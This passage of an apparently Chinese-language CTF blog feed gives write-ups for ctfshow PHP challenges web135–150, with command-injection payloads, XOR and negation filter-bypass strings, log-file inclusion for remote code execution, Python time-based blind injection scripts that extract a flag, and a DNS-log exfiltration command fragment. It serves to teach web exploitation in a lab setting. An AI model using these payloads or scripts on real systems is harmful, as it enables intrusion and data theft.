&quot;[a-z]&quot;/&quot;[0-9]&quot;`.j4ko5o.dnslog.cn -c 1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里awk &#x27;NR==15&#x27;表示的是读取第几行，这是从前面的flag出现的位置判断出来的。然后其他指令的意思web133有讲</span><br></pre></td></tr></table></figure><p>然后就去通过danslog查看拼接flag就好了。</p><h2 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222235502578.png" alt="image-20221222235502578"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223151706052.png" alt="image-20221223151706052"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tee  a指令会从标准输入设备读取数据，将其内容输出到标准输出设备，同时保存成文件a。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">先：</span><br><span class="line">?c=ls | tee a</span><br><span class="line">然后访问url/a,电脑会自动下载一个名为a的文件，然后查看文件，发现里面只有index.php</span><br><span class="line"></span><br><span class="line">?c=ls / | tee b</span><br><span class="line">发现里面有f149_15_h3r3</span><br><span class="line"></span><br><span class="line">?c=cat /f149_15_h3r3 | tee c</span><br></pre></td></tr></table></figure><p>然后就可以拿到flag了。</p><p><strong>解法二</strong></p><p>这个比较骚，就是把题目都给改了。</p><p><a href="https://blog.csdn.net/weixin_39731083/article/details/82495950">https://blog.csdn.net/weixin_39731083/article/details/82495950</a>  xargs sed命令介绍</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第一步：ls | xargs sed -i &quot;s/die/echo/&quot;   --&gt;-i是进入文本编辑模式 s是表示替换 这里是把die替换成echo</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第二步： ls | xargs sed -i &quot;s/exec/system/&quot;  /后面加个g的话是全局替换，不加是只替换匹配到的第一个</span><br></pre></td></tr></table></figure><h2 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223154219888.png" alt="image-20221223154219888"></p><p>这道题考察了就是如何不new一个参数也能访问类里边的函数。</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow=ctfshow::getFlag  ---&gt;就是  类名::函数名  这是函数得是static的情况下</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不是static的情况  ctfshow=call_user_func_array(array(new ctfshow(),&#x27;getFlag&#x27;))  ctfshow()---&gt;是类名   getFlag是函数名。</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223160407968.png" alt="image-20221223160407968"></p><h2 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223160443873.png" alt="image-20221223160443873"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223161022503.png" alt="image-20221223161022503"></p><p>利用这一函数的特性，也是不用：：的一种写法</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow[]=ctfshow&amp;ctfshow[]=getFlag</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223161241007.png" alt="image-20221223161241007"></p><h2 id="web139"><a href="#web139" class="headerlink" title="web139"></a>web139</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223161625931.png" alt="image-20221223161625931"></p><p>和web136一样，但是这题的tee和xargs sed用不了了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">所以得用命令执行的bash盲注</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223175030609.png" alt="image-20221223175030609"></p><p>拿到根目录下的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f149_15_h3r3</span><br></pre></td></tr></table></figure><p><strong>第一步拿根目录下的flag名字</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2021-10-04 08:43:04</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2021-10-04 12:03:52</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"><span class="comment"># /f149_15_h3r3</span></span><br><span class="line"><span class="comment"># ctfshow&#123;7bae6719-8739-4628-b57b-acf7a5fc4351&#125;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://35e55b2c-6023-4fc4-8835-40abd33dae52.challenge.ctf.show/?c=&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;if [ `cat /f149_15_h3r3  | cut -c &#123;&#125;` == \&quot;&#123;&#125;\&quot; ];then sleep 3;fi&quot;</span></span><br><span class="line">payload = <span class="string">&quot;if [ `ls / -1 | cut -c &#123;&#125; | awk \&#x27;NR==&#123;&#125;\&#x27;` == \&#x27;&#123;&#125;\&#x27; ];then sleep 4;fi&quot;</span>   <span class="comment">#cut是截断的意思，第一个括号是代表截断第几个字符 awk &#x27;NR==&#123;&#125;&#x27; 是查看第几行  最后一个&#123;&#125;代表着遇到哪个字符就截断</span></span><br><span class="line"><span class="comment"># payload的含义是，如果遇到该截断的字符，就会延时3秒，并进行截断。</span></span><br><span class="line">result = <span class="string">&quot;+++++++++++++++++&quot;</span></span><br><span class="line">row=<span class="number">6</span></span><br><span class="line">length=<span class="number">20</span></span><br><span class="line"></span><br><span class="line">strings  = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz_-0123456789&quot;</span></span><br><span class="line"><span class="comment">#strings  = &quot;ctfshow&#125;abdefgijklmnpqruvwxyz_-0123456789&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,row):</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,length):</span><br><span class="line"><span class="comment">#print(&quot;+++++++++++++++第&quot;+str(c)+&quot;个字符&quot;)</span></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> strings:</span><br><span class="line">target = url+payload.<span class="built_in">format</span>(c,i,s)    <span class="comment">#format()里面填的东西是上面payload&#123;&#125;中的东西</span></span><br><span class="line"><span class="built_in">print</span>(target)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">requests.get(target,timeout=<span class="number">3</span>)  <span class="comment">#如果请求在3秒之内完成就结束，如果超过3秒就会代表执行了sleep 4，就会执行下面的except:</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">result +=s</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">result += <span class="string">&quot; &quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>第二步，读取flag</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2021-10-04 08:43:04</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2021-10-04 12:03:52</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"><span class="comment"># /f149_15_h3r3</span></span><br><span class="line"><span class="comment"># ctfshow&#123;7bae6719-8739-4628-b57b-acf7a5fc4351&#125;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://35e55b2c-6023-4fc4-8835-40abd33dae52.challenge.ctf.show/?c=&quot;</span></span><br><span class="line">payload = <span class="string">&quot;if [ `cat /f149_15_h3r3  | cut -c &#123;&#125;` == \&quot;&#123;&#125;\&quot; ];then sleep 3;fi&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;if [ `ls / -1 | cut -c &#123;&#125; | awk \&#x27;NR==&#123;&#125;\&#x27;` == \&#x27;&#123;&#125;\&#x27; ];then sleep 4;fi&quot;   #cut是截断的意思，第一个括号是代表截断第几个字符 awk &#x27;NR==&#123;&#125;&#x27; 是查看第几行  最后一个&#123;&#125;代表着遇到哪个字符就截断</span></span><br><span class="line"><span class="comment"># payload的含义是，如果遇到该截断的字符，就会延时3秒，并进行截断。</span></span><br><span class="line">result = <span class="string">&quot;+++++++++++++++++&quot;</span></span><br><span class="line"><span class="comment">#row=6</span></span><br><span class="line">length=<span class="number">48</span></span><br><span class="line"></span><br><span class="line">strings  = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz_-0123456789&quot;</span></span><br><span class="line"><span class="comment">#strings  = &quot;ctfshow&#125;abdefgijklmnpqruvwxyz_-0123456789&#123;&quot;</span></span><br><span class="line"><span class="comment">#for i in range(1,row):</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,length):</span><br><span class="line"><span class="comment">#print(&quot;+++++++++++++++第&quot;+str(c)+&quot;个字符&quot;)</span></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> strings:</span><br><span class="line">target = url+payload.<span class="built_in">format</span>(c,s)    <span class="comment">#format()里面填的东西是上面payload&#123;&#125;中的东西</span></span><br><span class="line"><span class="built_in">print</span>(target)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">requests.get(target,timeout=<span class="number">3</span>)  <span class="comment">#如果请求在3秒之内完成就结束，如果超过3秒就会代表执行了sleep 4，就会执行下面的except:</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">result +=s</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">result += <span class="string">&quot; &quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223180716378.png" alt="image-20221223180716378"></p><p>把flag复制下来，然后把空格去掉，补上{}就能拿到flag了。</p><h2 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223182022441.png" alt="image-20221223182022441"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">思路就是让$code等于0，因为是弱类型比较，所以可以让0==&#x27;ctfshow&#x27;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223182148022.png" alt="image-20221223182148022"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f1=system&amp;f2=system   把system换成var_dump也行    exec/usleep也行，应该有很多，可以自己去试试</span><br></pre></td></tr></table></figure><h2 id="web141"><a href="#web141" class="headerlink" title="web141"></a>web141</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223202331719.png" alt="image-20221223202331719"></p><p>这里在本地试了下，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1+phpinfo()+1 ---&gt; 是可以执行出来的，所以这道题也可以利用这一特点， </span><br><span class="line">if(preg_match(&#x27;/^\W+$/&#x27;, $v3))  ----&gt;这个是正则的意思是不能含有字母，所以我们就可以通过异或来获取字母了。</span><br><span class="line">/^\W+$/ 作用是匹配非数字字母下划线的字符</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v3=%2b(%8c%86%8c%8b%9a%92^%ff%ff%ff%ff%ff%ff)(%8b%9e%9c%df%99%d5^%ff%ff%ff%ff%ff%ff)%2b</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=1&amp;v3=-(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)-&amp;v2=1</span><br></pre></td></tr></table></figure><p>无数字字母绕过正则表达式总结    yu师傅写的</p><p><a href="https://blog.csdn.net/miuzzx/article/details/109143413">https://blog.csdn.net/miuzzx/article/details/109143413</a>  </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223205123698.png" alt="image-20221223205123698"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223205156267.png" alt="image-20221223205156267"></p><h2 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223205353234.png" alt="image-20221223205353234"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223205452667.png" alt="image-20221223205452667"></p><h2 id="web143"><a href="#web143" class="headerlink" title="web143"></a>web143</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223205853208.png" alt="image-20221223205853208"></p><p>和web141差不多</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223210018653.png" alt="image-20221223210018653"></p><p>用web141的payload，然后把%2b换成*号就行</p><h2 id="web144"><a href="#web144" class="headerlink" title="web144"></a>web144</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223210505198.png" alt="image-20221223210505198"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">就是不一定得是这种格式  1+phpinfo()+1   1+1+phpinfo()这种形式也行</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?v1=1&amp;v2=-(%8c%86%8c%8b%9a%92^%ff%ff%ff%ff%ff%ff)(%8b%9e%9c%df%99%d5^%ff%ff%ff%ff%ff%ff)&amp;v3=1</span><br><span class="line"></span><br><span class="line">//  就是11-xxxxxx</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223210903738.png" alt="image-20221223210903738"></p><h2 id="web145"><a href="#web145" class="headerlink" title="web145"></a>web145</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223211005710.png" alt="image-20221223211005710"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223211416842.png" alt="image-20221223211416842"></p><p>就是其他加减乘除异或符号全被过滤了，但是在本地试了下  |没有被过滤，所以还是可以用的</p><p>但是取反没有被过滤，所以可以尝试来解</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=1&amp;v2=1&amp;v3=|(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)|</span><br></pre></td></tr></table></figure><h2 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223211955658.png" alt="image-20221223211955658"></p><p>用上一题的payload直接就可以打通关了</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223212053007.png" alt="image-20221223212053007"></p><p>前面给过yu师傅写的构造方法了，这里在给一下</p><p><a href="https://blog.csdn.net/miuzzx/article/details/109143413">https://blog.csdn.net/miuzzx/article/details/109143413</a></p><h2 id="web147"><a href="#web147" class="headerlink" title="web147"></a>web147</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223212251086.png" alt="image-20221223212251086"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里的正则是第一个字符不能是数字字母 所以可以用   \   绕过</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php里默认命名空间是\，所有原生函数和类都在这个命名空间中。 普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路 径； 而如果写\function_name()这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写 法</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由于第一个参数为空，那么我们就得考虑去找一个能执行第一个参数为空的函数了，那么create_functino()就可以</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223213534323.png" alt="image-20221223213534323"></p><p>这里的思路是用}先把第一个if给包含住，然后在进行rce，后面的{是为了把下一行的}给包含住，#是为了把);给注释掉。</p><p>然后就可以进行rce了</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223213759296.png" alt="image-20221223213759296"></p><h2 id="web148"><a href="#web148" class="headerlink" title="web148"></a>web148</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223214111128.png" alt="image-20221223214111128"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223214505853.png" alt="image-20221223214505853"></p><p>本地试过了，这样也可以执行，那么就可以构造get_ctfshow_fl0g()</p><p>这是解法1</p><p><strong>解法二</strong></p><p>直接可以在eval里进行命令执行</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=(%8c%86%8c%8b%9a%92^%ff%ff%ff%ff%ff%ff)(%8b%9e%9c%df%99%d5^%ff%ff%ff%ff%ff%ff);</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223214653400.png" alt="image-20221223214653400"></p><h2 id="web149"><a href="#web149" class="headerlink" title="web149"></a>web149</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223221028213.png" alt="image-20221223221028213"></p><p>这里不能用其他文件来新建的原因是unlink函数会把其他函数给删除掉</p><p>所以只能覆盖掉index.php</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223221205356.png" alt="image-20221223221205356"></p><p>然后在访问index.php，进行post  rce 就能拿到flag了。</p><h2 id="web150"><a href="#web150" class="headerlink" title="web150"></a>web150</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224145925518.png" alt="image-20221224145925518"></p><p>这道题可以用文件包含日志 /var/log/nginx/access.log</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">就是因为$key为url/?后面的东西，那么在extract($_GET);传isVIP的时候，就要注意不能传有关正则匹配中的东西，不然的话就会代码就会执行结束。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里的post传ctf的时候不含:就行，那么只要符合上述条件就行了。</span><br></pre></td></tr></table></figure><p>这里就可以考虑文件包含日志了。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224150819031.png" alt="image-20221224150819031"></p><p>服务器是nginx的，那么就利用nginx的默认日志路径</p><p>只有一次机会，写错了就得重新开环境。</p><p><strong>第一步</strong></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224151001019.png" alt="image-20221224151001019"></p><p><strong>第二步</strong></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224194408896.png" alt="image-20221224194408896"></p><p><strong>第三步</strong></p><p>进行rce</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224194509564.png" alt="image-20221224194509564"></p><p>拿到flag.</p><h2 id="web150-plus"><a href="#web150-plus" class="headerlink" title="web150_plus"></a>web150_plus</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224194638649.png" alt="image-20221224194638649"></p><p>这里不给用日志包含了</p><p><strong>题解释</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">这个题一点点小坑__autoload()函数不是类里面的</span><br><span class="line">__autoload — 尝试加载未定义的类</span><br><span class="line">最后构造?..CTFSHOW..=phpinfo就可以看到phpinfo信息啦</span><br><span class="line">原因是..CTFSHOW..解析变量成__CTFSHOW__然后进行了变量覆盖，因为CTFSHOW是类就会使用</span><br><span class="line">__autoload()函数方法，去加载，因为等于phpinfo就会去加载phpinfo</span><br><span class="line">接下来就去getshell啦</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224195350241.png" alt="image-20221224195350241"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224195525809.png" alt="image-20221224195525809"></p><p>直接拿到flag.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;web89&quot;&gt;&lt;a href=&quot;#web89&quot; class=&quot;headerlink&quot; title=&quot;web89&quot;&gt;&lt;/a&gt;web89&lt;/h2&gt;&lt;p&gt;源码&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;C:\Users\sdbdb\AppData\Roaming\Typora\</summary>
      
    
    
    
    
    <category term="ctfshow PHP特性" scheme="https://ke1nys.github.io/tags/ctfshow-PHP%E7%89%B9%E6%80%A7/"/>
    
  </entry>
  
  <entry>
    <title>buu刷题记录</title>
    <link href="https://ke1nys.github.io/posts/71cd69a5.html"/>
    <id>https://ke1nys.github.io/posts/71cd69a5.html</id>
    <published>2022-12-18T07:30:21.000Z</published>
    <updated>2022-12-18T07:38:32.898Z</updated>
    
    <content type="html"><![CDATA[<p>之前也是写在了csdn上。</p><p><a href="https://mp.csdn.net/mp_blog/manage/article?spm=1011.2124.3001.5298">https://mp.csdn.net/mp_blog/manage/article?spm=1011.2124.3001.5298</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;之前也是写在了csdn上。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://mp.csdn.net/mp_blog/manage/article?spm=1011.2124.3001.5298&quot;&gt;https://mp.csdn.net/mp_blog/manage/arti</summary>
      
    
    
    
    
    <category term="buu" scheme="https://ke1nys.github.io/tags/buu/"/>
    
  </entry>
  
</feed>
